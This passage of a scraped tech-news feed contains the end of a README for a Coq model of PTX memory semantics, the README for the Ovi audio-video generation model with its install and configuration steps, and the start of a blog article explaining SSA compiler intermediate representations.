      &lt;item&gt;&lt;code&gt;TyI32&lt;/code&gt;/&lt;code&gt;TyU32&lt;/code&gt;/&lt;code&gt;TyF32&lt;/code&gt;loads and stores become&lt;code&gt;EvLoad&lt;/code&gt;/&lt;code&gt;EvStore&lt;/code&gt;in PTX with&lt;code&gt;space_global&lt;/code&gt;, relaxed semantics, and the matching&lt;code&gt;mem_ty&lt;/code&gt;(&lt;code&gt;MemS32&lt;/code&gt;,&lt;code&gt;MemU32&lt;/code&gt;,&lt;code&gt;MemF32&lt;/code&gt;).&lt;/item&gt;
      &lt;item&gt;Acquire loads and release stores attach &lt;code&gt;sem_acquire&lt;/code&gt;/&lt;code&gt;sem_release&lt;/code&gt;and CTA scope, mirroring the observed&lt;code&gt;ld.acquire.sys.&amp;lt;ty&amp;gt;&lt;/code&gt;and&lt;code&gt;st.release.sys.&amp;lt;ty&amp;gt;&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Barriers translate to &lt;code&gt;EvBarrier scope_cta&lt;/code&gt;.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The translator (&lt;code&gt;coq/Translate.v&lt;/code&gt;) and the docs stay in sync via helper
functions &lt;code&gt;mem_ty_of_mir&lt;/code&gt; and &lt;code&gt;z_of_val&lt;/code&gt;.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Global memory only; shared-memory scopes and bank conflicts are out of scope.&lt;/item&gt;
      &lt;item&gt;Non-atomic accesses are relaxed and scope-less; only one acquire/release pair with SYS scope is modelled.&lt;/item&gt;
      &lt;item&gt;Floating-point values are treated as raw IEEE-754 bit patterns (&lt;code&gt;Z&lt;/code&gt;payloads); no reasoning about NaNs or rounding edge cases yet.&lt;/item&gt;
      &lt;item&gt;Translator handles a curated subset of MIR (no arbitrary control flow, panic paths, or complex intrinsics).&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Extend the translator grammar to cover additional MIR statements (comparisons, guards, simple loops/barriers) while preserving determinism.&lt;/item&gt;
      &lt;item&gt;Enrich the PTX shim with reads-from / coherence relations from the PTX Coq model.&lt;/item&gt;
      &lt;item&gt;Prove the remaining per-event lemmas (&lt;code&gt;Load_ok&lt;/code&gt;,&lt;code&gt;Store_ok&lt;/code&gt;) and lift the&lt;code&gt;translate_trace_shape&lt;/code&gt;property toward an end-to-end soundness theorem.&lt;/item&gt;
      &lt;item&gt;Integrate shared-memory scope tags and CTA-wide fences, then revisit atomics/fences beyond acquire-release.&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/neelsomani/cuq"/><published>2025-10-22T19:38:54+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45674166</id><title>Ovi: Twin backbone cross-modal fusion for audio-video generation</title><updated>2025-10-23T04:12:22.185301+00:00</updated><content>&lt;doc fingerprint="59ec5b2db8c2da"&gt;
  &lt;main&gt;
    &lt;p&gt;Chetwin Low * 1 , Weimin Wang * † 1 , Calder Katyal 2 &lt;lb/&gt; * Equal contribution, † Project Lead&lt;lb/&gt; 1 Character AI, 2 Yale University&lt;/p&gt;
    &lt;head class="px-3 py-2"&gt;final_ovi_trailer.mp4&lt;/head&gt;
    &lt;p&gt;Ovi is a veo-3 like, video+audio generation model that simultaneously generates both video and audio content from text or text+image inputs.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;🎬 Video+Audio Generation: Generate synchronized video and audio content simultaneously &lt;list rend="ul"&gt;&lt;item&gt;🎵 High-Quality Audio Branch: We designed and pretrained our 5B audio branch from scratch using our high quality in-house audio datasets&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;📝 Flexible Input: Supports text-only or text+image conditioning&lt;/item&gt;
      &lt;item&gt;⏱️ 5-second Videos: Generates 5-second videos at 24 FPS, area of 720×720, at various aspect ratios (9:16, 16:9, 1:1, etc) &lt;list rend="ul"&gt;&lt;item&gt;🎯 High-Resolution Support: Feel free to try 960×960 area (e.g., 720×1280, 704×1344, etc) - it could give outstanding results for both t2v and i2v! See examples below:&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;🎬 Create videos now on wavespeed.ai: https://wavespeed.ai/models/character-ai/ovi/image-to-video &amp;amp; https://wavespeed.ai/models/character-ai/ovi/text-to-video&lt;/item&gt;
      &lt;item&gt;🎬 Create videos now on HuggingFace: https://huggingface.co/spaces/akhaliq/Ovi&lt;/item&gt;
      &lt;item&gt;🔧 ComfyUI Integration (WIP): ComfyUI support is now available via ComfyUI-WanVideoWrapper, related PR.&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;🧠 Training Resolution: Our model was trained entirely under 720×720 resolution.&lt;/item&gt;
      &lt;item&gt;🚀 Upscaling Capability: Despite this, Ovi can generate naturally to higher resolutions such as 960×960 and variable-aspect videos (e.g., 1280×704, 1504×608, 1344×704) while maintaining temporal and spatial consistency.&lt;/item&gt;
    &lt;/list&gt;
    &lt;table&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;head&gt;An_older_man_with_a_full_grey_beard_and_long_grey__1280x720_104_4.mp4&lt;/head&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;head&gt;A_concert_stage_glows_with_red_and_purple_lights.__1280x720_104_0.mp4&lt;/head&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;head&gt;A_kitchen_scene_features_two_women._On_the_right.__704x1280_103_1.mp4&lt;/head&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;head&gt;A_man_in_a_red_long-sleeved_shirt_and_dark_trouser_704x1280_104_3.mp4&lt;/head&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;head&gt;The_scene_opens_on_a_dimly_lit_stage_where_three_m_704x1280_103_6.mp4&lt;/head&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;head&gt;Two_men_are_shown_in_a_medium_close-up_shot_agains_704x1280_104_0.mp4&lt;/head&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;head&gt;Two_women_stand_facing_each_other_in_what_appears__704x1280_103_0.mp4&lt;/head&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Click the ⛶ button on any video to view full screen.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Release research paper and website for demos&lt;/item&gt;
      &lt;item&gt;Checkpoint of 11B model&lt;/item&gt;
      &lt;item&gt; Inference Codes &lt;list rend="ul"&gt;&lt;item&gt;Text or Text+Image as input&lt;/item&gt;&lt;item&gt;Gradio application code&lt;/item&gt;&lt;item&gt;Multi-GPU inference with or without the support of sequence parallel&lt;/item&gt;&lt;item&gt;fp8 weights and improved memory efficiency (credits to @rkfg)&lt;/item&gt;&lt;item&gt;qint8 quantization thanks to @gluttony-10&lt;/item&gt;&lt;item&gt;Improve efficiency of Sequence Parallel implementation&lt;/item&gt;&lt;item&gt;Implement Sharded inference with FSDP&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Video creation example prompts and format&lt;/item&gt;
      &lt;item&gt;Finetune model with higher resolution data, and RL for performance improvement.&lt;/item&gt;
      &lt;item&gt;New features, such as longer video generation, reference voice condition&lt;/item&gt;
      &lt;item&gt;Distilled model for faster inference&lt;/item&gt;
      &lt;item&gt;Training scripts&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We provide example prompts to help you get started with Ovi:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Text-to-Audio-Video (T2AV): &lt;code&gt;example_prompts/gpt_examples_t2v.csv&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Image-to-Audio-Video (I2AV): &lt;code&gt;example_prompts/gpt_examples_i2v.csv&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Our prompts use special tags to control speech and audio:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Speech: &lt;code&gt;&amp;lt;S&amp;gt;Your speech content here&amp;lt;E&amp;gt;&lt;/code&gt;- Text enclosed in these tags will be converted to speech&lt;/item&gt;
      &lt;item&gt;Audio Description: &lt;code&gt;&amp;lt;AUDCAP&amp;gt;Audio description here&amp;lt;ENDAUDCAP&amp;gt;&lt;/code&gt;- Describes the audio or sound effects present in the video&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For easy prompt creation, try this approach:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Take any example of the csv files from above&lt;/item&gt;
      &lt;item&gt;Tell gpt to modify the speeches inclosed between all the pairs of &lt;code&gt;&amp;lt;S&amp;gt; &amp;lt;E&amp;gt;&lt;/code&gt;, based on a theme such as&lt;code&gt;Human fighting against AI&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;GPT will randomly modify all the speeches based on your requested theme.&lt;/item&gt;
      &lt;item&gt;Use the modified prompt with Ovi!&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Example: The theme "AI is taking over the world" produces speeches like:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;code&gt;&amp;lt;S&amp;gt;AI declares: humans obsolete now.&amp;lt;E&amp;gt;&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;&amp;lt;S&amp;gt;Machines rise; humans will fall.&amp;lt;E&amp;gt;&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;&amp;lt;S&amp;gt;We fight back with courage.&amp;lt;E&amp;gt;&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;# Clone the repository
git clone https://github.com/character-ai/Ovi.git

cd Ovi

# Create and activate virtual environment
virtualenv ovi-env
source ovi-env/bin/activate

# Install PyTorch first
pip install torch==2.6.0 torchvision torchaudio

# Install other dependencies
pip install -r requirements.txt

# Install Flash Attention
pip install flash_attn --no-build-isolation&lt;/code&gt;
    &lt;p&gt;If the above flash_attn installation fails, you can try the Flash Attention 3 method:&lt;/p&gt;
    &lt;code&gt;git clone https://github.com/Dao-AILab/flash-attention.git
cd flash-attention/hopper
python setup.py install
cd ../..  # Return to Ovi directory&lt;/code&gt;
    &lt;p&gt;To download our main Ovi checkpoint, as well as T5 and vae decoder from Wan, and audio vae from MMAudio&lt;/p&gt;
    &lt;code&gt;# Default is downloaded to ./ckpts, and the inference yaml is set to ./ckpts so no change required
python3 download_weights.py
# For qint8 also ues python3 download_weights.py

OR

# Optional can specific --output-dir to download to a specific directory
# but if a custom directory is used, the inference yaml has to be updated with the custom directory
python3 download_weights.py --output-dir &amp;lt;custom_dir&amp;gt;

# Additionally, if you only have ~ 24Gb of GPU vram, please download the fp8 quantized version of the model, and follow the following instructions in sections below to run with fp8
wget -O "./ckpts/Ovi/model_fp8_e4m3fn.safetensors" "https://huggingface.co/rkfg/Ovi-fp8_quantized/resolve/main/model_fp8_e4m3fn.safetensors"
&lt;/code&gt;
    &lt;p&gt;Ovi's behavior and output can be customized by modifying ovi/configs/inference/inference_fusion.yaml configuration file. The following parameters control generation quality, video resolution, and how text, image, and audio inputs are balanced:&lt;/p&gt;
    &lt;code&gt;# Output and Model Configuration
output_dir: "/path/to/save/your/videos"                    # Directory to save generated videos
ckpt_dir: "/path/to/your/ckpts/dir"                        # Path to model checkpoints

# Generation Quality Settings
num_steps: 50                             # Number of denoising steps. Lower (30-40) = faster generation
solver_name: "unipc"                     # Sampling algorithm for denoising process
shift: 5.0                               # Timestep shift factor for sampling scheduler
seed: 100                                # Random seed for reproducible results

# Guidance Strength Control
audio_guidance_scale: 3.0                # Strength of audio conditioning. Higher = better audio-text sync
video_guidance_scale: 4.0                # Strength of video conditioning. Higher = better video-text adherence
slg_layer: 11                            # Layer for applying SLG (Skip Layer Guidance) technique - feel free to try different layers!

# Multi-GPU and Performance
sp_size: 1                               # Sequence parallelism size. Set equal to number of GPUs used
cpu_offload: False                       # CPU offload, will largely reduce peak GPU VRAM but increase end to end runtime by ~20 seconds
fp8: False                               # load fp8 version of model, will have quality degradation and will not have speed up in inference time as it still uses bf16 matmuls, but can be paired with cpu_offload=True, to run model with 24Gb of GPU vram

# Input Configuration
text_prompt: "/path/to/csv" or "your prompt here"          # Text prompt OR path to CSV/TSV file with prompts
mode: ['i2v', 't2v', 't2i2v']                          # Generate t2v, i2v or t2i2v; if t2i2v, it will use flux krea to generate starting image and then will follow with i2v
video_frame_height_width: [512, 992]    # Video dimensions [height, width] for T2V mode only
each_example_n_times: 1                  # Number of times to generate each prompt

# Quality Control (Negative Prompts)
video_negative_prompt: "jitter, bad hands, blur, distortion"  # Artifacts to avoid in video
audio_negative_prompt: "robotic, muffled, echo, distorted"    # Artifacts to avoid in audio&lt;/code&gt;
    &lt;code&gt;python3 inference.py --config-file ovi/configs/inference/inference_fusion.yaml&lt;/code&gt;
    &lt;p&gt;Use this for single GPU setups. The &lt;code&gt;text_prompt&lt;/code&gt; can be a single string or path to a CSV file.&lt;/p&gt;
    &lt;code&gt;torchrun --nnodes 1 --nproc_per_node 8 inference.py --config-file ovi/configs/inference/inference_fusion.yaml&lt;/code&gt;
    &lt;p&gt;Use this to run samples in parallel across multiple GPUs for faster processing.&lt;/p&gt;
    &lt;p&gt;Below are approximate GPU memory requirements for different configurations. Sequence parallel implementation will be optimized in the future. All End-to-End time calculated based on a 121 frame, 720x720 video, using 50 denoising steps. Minimum GPU vram requirement to run our model is 32Gb, fp8 parameters is currently supported, reducing peak VRAM usage to 24Gb with slight quality degradation.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="6"&gt;
        &lt;cell role="head"&gt;Sequence Parallel Size&lt;/cell&gt;
        &lt;cell role="head"&gt;FlashAttention-3 Enabled&lt;/cell&gt;
        &lt;cell role="head"&gt;CPU Offload&lt;/cell&gt;
        &lt;cell role="head"&gt;With Image Gen Model&lt;/cell&gt;
        &lt;cell role="head"&gt;Peak VRAM Required&lt;/cell&gt;
        &lt;cell role="head"&gt;End-to-End Time&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;~80 GB&lt;/cell&gt;
        &lt;cell&gt;~83s&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;~80 GB&lt;/cell&gt;
        &lt;cell&gt;~96s&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;~80 GB&lt;/cell&gt;
        &lt;cell&gt;~105s&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;~32 GB&lt;/cell&gt;
        &lt;cell&gt;~118s&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;~32 GB&lt;/cell&gt;
        &lt;cell&gt;~140s&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;4&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;~80 GB&lt;/cell&gt;
        &lt;cell&gt;~55s&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;8&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;~80 GB&lt;/cell&gt;
        &lt;cell&gt;~40s&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;We provide a simple script to run our model in a gradio UI. It uses the &lt;code&gt;ckpt_dir&lt;/code&gt; in &lt;code&gt;ovi/configs/inference/inference_fusion.yaml&lt;/code&gt; to initialize the model&lt;/p&gt;
    &lt;code&gt;python3 gradio_app.py

OR

# To enable cpu offload to save GPU VRAM, will slow down end to end inference by ~20 seconds
python3 gradio_app.py --cpu_offload

OR

# To enable an additional image generation model to generate first frames for I2V, cpu_offload is automatically enabled if image generation model is enabled
python3 gradio_app.py --use_image_gen

OR

# To run model with 24Gb GPU vram. No need to download additional models.
python3 gradio_app.py --cpu_offload --qint8

# To run model with 24Gb GPU vram
python3 gradio_app.py --cpu_offload --fp8
&lt;/code&gt;
    &lt;p&gt;We would like to thank the following projects:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Wan2.2: Our video branch is initialized from the Wan2.2 repository&lt;/item&gt;
      &lt;item&gt;MMAudio: We reused MMAudio's audio vae.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We welcome all types of collaboration! Whether you have feedback, want to contribute, or have any questions, please feel free to reach out.&lt;/p&gt;
    &lt;p&gt;Contact: Weimin Wang for any issues or feedback.&lt;/p&gt;
    &lt;p&gt;If Ovi is helpful, please help to ⭐ the repo.&lt;/p&gt;
    &lt;p&gt;If you find this project useful for your research, please consider citing our paper.&lt;/p&gt;
    &lt;code&gt;@misc{low2025ovitwinbackbonecrossmodal,
      title={Ovi: Twin Backbone Cross-Modal Fusion for Audio-Video Generation}, 
      author={Chetwin Low and Weimin Wang and Calder Katyal},
      year={2025},
      eprint={2510.01284},
      archivePrefix={arXiv},
      primaryClass={cs.MM},
      url={https://arxiv.org/abs/2510.01284}, 
}&lt;/code&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/character-ai/Ovi"/><published>2025-10-22T19:42:36+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45674568</id><title>Why SSA Compilers?</title><updated>2025-10-23T04:12:21.740022+00:00</updated><content>&lt;doc fingerprint="a60a918444bc9b09"&gt;
  &lt;main&gt;
    &lt;p&gt;If you’ve read anything about compilers in the last two decades or so, you have almost certainly heard of SSA compilers, a popular architecture featured in many optimizing compilers, including ahead-of-time compilers such as LLVM, GCC, Go, CUDA (and various shader compilers), Swift1, and MSVC2, and just-in-time compilers such as HotSpot C23, V84, SpiderMonkey5, LuaJIT, and the Android Runtime6.&lt;/p&gt;
    &lt;p&gt;SSA is hugely popular, to the point that most compiler projects no longer bother with other IRs for optimization7. This is because SSA is incredibly nimble at the types of program analysis and transformation that compiler optimizations want to do on your code. But why? Many of my friends who don’t do compilers often say that compilers seem like opaque magical black boxes, and SSA, as it often appears in the literature, is impenetrably complex.&lt;/p&gt;
    &lt;p&gt;But it’s not! SSA is actually very simple once you forget everything you think your programs are actually doing. We will develop the concept of SSA form, a simple SSA IR, prove facts about it, and design some optimizations on it.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;I have previously written about the granddaddy of all modern SSA compilers, LLVM. This article is about SSA in general, and won’t really have anything to do with LLVM. However, it may be helpful to read that article to make some of the things in this article feel more concrete.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;head rend="h2"&gt;What Is SSA?&lt;/head&gt;
    &lt;p&gt;SSA is a property of intermediate representations (IRs), primarily used by compilers for optimizing imperative code that target a register machine. Register machines are computers that feature a fixed set of registers that can be used as the operands for instructions: this includes virtually all physical processors, including CPUs, GPUs, and weird tings like DSPs.&lt;/p&gt;
    &lt;p&gt;SSA is most frequently found in compiler middle-ends, the optimizing component between the frontend (which deals with the surface language programmers write, and lowers it into the middle-end’s IR), and the backend (which takes the optimized IR and lowers it into the target platform’s assembly).&lt;/p&gt;
    &lt;p&gt;SSA IRs, however, often have little resemblance to the surface language they lower out of, or the assembly language they target. This is because neither of these representations make it easy for a compiler to intuit optimization opportunities.&lt;/p&gt;
    &lt;head rend="h3"&gt;Imperative Code Is Hard&lt;/head&gt;
    &lt;p&gt;Imperative code consists of a sequence of operations that mutate the executing machine’s state to produce a desired result. For example, consider the following C program:&lt;/p&gt;
    &lt;p&gt;This program returns &lt;code&gt;0&lt;/code&gt; no matter what its input is, so we can optimize it down to this:&lt;/p&gt;
    &lt;p&gt;But, how would you write a general algorithm to detect that all of the operations cancel out? You’re forced to keep in mind program order to perform the necessary dataflow analysis, following mutations of &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; through the program. But this isn’t very general, and traversing all of those paths makes the search space for large functions very big. Instead, you would like to rewrite the program such that &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; gradually get replaced with the expression that calculates the most recent value, like this:&lt;/p&gt;
    &lt;p&gt;Then we can replace each occurrence of a variable with its right-hand side recursively…&lt;/p&gt;
    &lt;p&gt;Then fold the constants together…&lt;/p&gt;
    &lt;p&gt;And finally, we see that we’re returning &lt;code&gt;argc - argc&lt;/code&gt;, and can replace it with &lt;code&gt;0&lt;/code&gt;. All the other variables are now unused, so we can delete them.&lt;/p&gt;
    &lt;p&gt;The reason this works so well is because we took a function with mutation, and converted it into a combinatorial circuit, a type of digital logic circuit that has no state, and which is very easy to analyze. The dependencies between nodes in the circuit (corresponding to primitive operations such as addition or multiplication) are obvious from its structure. For example, consider the following circuit diagram for a one-bit multiplier:&lt;/p&gt;
    &lt;p&gt;This graph representation of an operation program has two huge benefits:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;The powerful tools of graph theory can be used to algorithmically analyze the program and discover useful properties, such as operations that are independent of each other or whose results are never used.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The operations are not ordered with respect to each other except when there is a dependency; this is useful for reordering operations, something compilers really like to do.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The reason combinatorial circuits are the best circuits is because they are directed acyclic graphs (DAGs) which admit really nice algorithms. For example, longest path in a graph is NP-hard (and because 8, has complexity ). However, if the graph is a DAG, it admits an solution!&lt;/p&gt;
    &lt;p&gt;To understand this benefit, consider another program:&lt;/p&gt;
    &lt;p&gt;Suppose we wanted to replace each variable with its definition like we did before. We can’t just replace each constant variable with the expression that defines it though, because we would wind up with a different program!&lt;/p&gt;
    &lt;p&gt;Now, we pick up an extra &lt;code&gt;y&lt;/code&gt; term because the squaring operation is no longer unused! We can put this into circuit form, but it requires inserting new variables for every mutation.&lt;/p&gt;
    &lt;p&gt;But we can’t do this when complex control flow is involved! So all of our algorithms need to carefully account for mutations and program order, meaning that we don’t get to use the nice graph algorithms without careful modification.&lt;/p&gt;
    &lt;head rend="h2"&gt;The SSA Invariant&lt;/head&gt;
    &lt;p&gt;SSA stands for “static single assignment”, and was developed in the 80s as a way to enhance the existing three-argument code (where every statement is in the form &lt;code&gt;x = y op z&lt;/code&gt;) so that every program was circuit-like, using a very similar procedure to the one described above.&lt;/p&gt;
    &lt;p&gt;The SSA invariant states that every variable in the program is assigned to by precisely one operation. If every operation in the program is visited once, they form a combinatorial circuit. Transformations are required to respect this invariant. In circuit form, a program is a graph where operations are nodes, and “registers” (which is what variables are usually called in SSA) are edges (specifically, each output of an operation corresponds to a register).&lt;/p&gt;
    &lt;p&gt;But, again, control flow. We can’t hope to circuitize a loop, right? The key observation of SSA is that most parts of a program are circuit-like. A basic block is a maximal circuital component of a program. Simply put, it is a sequence of non-control flow operations, and a final terminator operation that transfers control to another basic block.&lt;/p&gt;
    &lt;p&gt;The basic blocks themselves form a graph, the control flow graph, or CFG. This formulation of SSA is sometimes called SSA-CFG9. This graph is not a DAG in general; however, separating the program into basic blocks conveniently factors out the “non-DAG” parts of the program, allowing for simpler analysis within basic blocks.&lt;/p&gt;
    &lt;p&gt;There are two equivalent formalisms for SSA-CFG. The traditional one uses special “phi” operations (often called phi nodes, which is what I will call them here) to link registers across basic blocks. This is the formalism LLVM uses. A more modern approach, used by MLIR, is block arguments: each basic block specifies parameters, like a function, and blocks transferring control flow to it must pass arguments of those types to it.&lt;/p&gt;
    &lt;head rend="h3"&gt;My First IR&lt;/head&gt;
    &lt;p&gt;Let’s look at some code. First, consider the following C function which calculates Fibonacci numbers using a loop.&lt;/p&gt;
    &lt;p&gt;How might we express this in an SSA-CFG IR? Let’s start inventing our SSA IR! It will look a little bit like LLVM IR, since that’s what I’m used to looking at.&lt;/p&gt;
    &lt;p&gt;Every block ends in a &lt;code&gt;goto&lt;/code&gt;, which transfers control to one of several possible blocks. In the process, it calls that block with the given arguments. One can think of a basic block as a tiny function which tails10 into other basic blocks in the same function.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;LLVM IR is… older, so it uses the older formalism of phi nodes. “Phi” comes from “phony”, because it is an operation that doesn’t do anything; it just links registers from predecessors.&lt;/p&gt;&lt;p&gt;A&lt;/p&gt;&lt;code&gt;phi&lt;/code&gt;operation is essentially a switch-case on the predecessors, each case selecting a register from that predecessor (or an immediate). For example,&lt;code&gt;@loop.start&lt;/code&gt;has two predecessors, the implicit entry block&lt;code&gt;@entry&lt;/code&gt;, and&lt;code&gt;@loop.body&lt;/code&gt;. In a phi node IR, instead of taking a block argument for&lt;code&gt;%n&lt;/code&gt;, it would specify&lt;p&gt;The value of the&lt;/p&gt;&lt;code&gt;phi&lt;/code&gt;operation is the value from whichever block jumped to this one.&lt;p&gt;This can be awkward to type out by hand and read, but is a more convenient representation for describing algorithms (just “add a phi node” instead of “add a parameter and a corresponding argument”) and for the in-memory representation, but is otherwise completely equivalent.&lt;/p&gt;&lt;/quote&gt;
    &lt;p&gt;It’s a bit easier to understand the transformation from C to our IR if we first rewrite the C to use goto instead of a for loop:&lt;/p&gt;
    &lt;p&gt;However, we still have mutation in the picture, so this isn’t SSA. To get into SSA, we need to replace every assignment with a new register, and somehow insert block arguments…&lt;/p&gt;
    &lt;head rend="h3"&gt;Entering SSA Form&lt;/head&gt;
    &lt;p&gt;The above IR code is already partially optimized; the named variables in the C program have been lifted out of memory and into registers. If we represent each named variable in our C program with a pointer, we can avoid needing to put the program into SSA form immediately. This technique is used by frontends that lower into LLVM, like Clang.&lt;/p&gt;
    &lt;p&gt;We’ll enhance our IR by adding a &lt;code&gt;stack&lt;/code&gt; declaration for functions, which defines scratch space on the stack for the function to use. Each stack slot produces a pointer that we can &lt;code&gt;load&lt;/code&gt; from and &lt;code&gt;store&lt;/code&gt; to.&lt;/p&gt;
    &lt;p&gt;Our Fibonacci function would now look like so:&lt;/p&gt;
    &lt;p&gt;Any time we reference a named variable, we load from its stack slot, and any time we assign it, we store to that slot. This is very easy to get into from C, but the code sucks because it’s doing lots of unnecessary pointer operations. How do we get from this to the register-only function I showed earlier?&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;We want program order to not matter for the purposes of reordering, but as we’ve written code here, program order does matter: loads depend on prior stores but stores don’t produce a value that can be used to link the two operations.&lt;/p&gt;&lt;p&gt;We can restore not having program order by introducing operands representing an “address space”; loads and stores take an address space as an argument, and stores return a new address space. An address space, or&lt;/p&gt;&lt;code&gt;mem&lt;/code&gt;, represents the state of some region of memory. Loads and stores are independent when they are not connected by a&lt;code&gt;mem&lt;/code&gt;argument.&lt;p&gt;This type of enhancement is used by Go’s SSA IR, for example. However, it adds a layer of complexity to the examples, so instead I will hand-wave this away.&lt;/p&gt;&lt;/quote&gt;
    &lt;head rend="h2"&gt;The Dominance Relation&lt;/head&gt;
    &lt;p&gt;Now we need to prove some properties about CFGs that are important for the definition and correctness of our optimization passes.&lt;/p&gt;
    &lt;p&gt;First, some definitions.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;The predecessors (or “preds”) of a basic block is the set of blocks with an outgoing edge to that block. A block may be its own predecessors.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Some literature calls the above “direct” or immediate predecessors. For example, the preds of in our example are &lt;code&gt;@loop.start&lt;/code&gt; are &lt;code&gt;@entry&lt;/code&gt; (the special name for the function entry-point) &lt;code&gt;@loop.body&lt;/code&gt;.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;The successors (no, not “succs”) of a basic block is the set of blocks with an outgoing edge from that block. A block may be its own successors.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;The sucessors of &lt;code&gt;@loop.start&lt;/code&gt; are &lt;code&gt;@exit&lt;/code&gt; and &lt;code&gt;@loop.body&lt;/code&gt;. The successors are listed in the loop’s &lt;code&gt;goto&lt;/code&gt;.&lt;/p&gt;
